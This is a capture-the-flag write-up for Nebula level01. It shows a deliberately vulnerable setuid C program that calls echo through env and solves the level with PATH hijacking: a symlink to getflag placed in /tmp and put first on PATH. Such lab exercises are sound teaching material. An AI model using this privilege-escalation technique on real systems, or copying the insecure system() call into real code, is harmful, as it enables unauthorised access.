# Nebula
## level01
### Prompt
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

### Solution
When a command is executed the system looks recursively inside the folders specified in the PATH until it finds a binary with the name of the command.

We want to create a symlink to ``/bin/getflag`` first. 

```shell
level01@nebula:/home/flag01$ ln -s /bin/getflag /tmp/echo
```

Then add ``/tmp`` to PATH.
```shell
level01@nebula:/home/flag01$ export PATH=/tmp:$PATH
```

When ``/usr/bin/env echo`` is executed the system looks in the PATH for a file named ``echo``. It finds our symlink and executes ``getflag``.
```shell
level01@nebula:/home/flag01$ ./flag01
You have successfully executed getflag on a target account
```
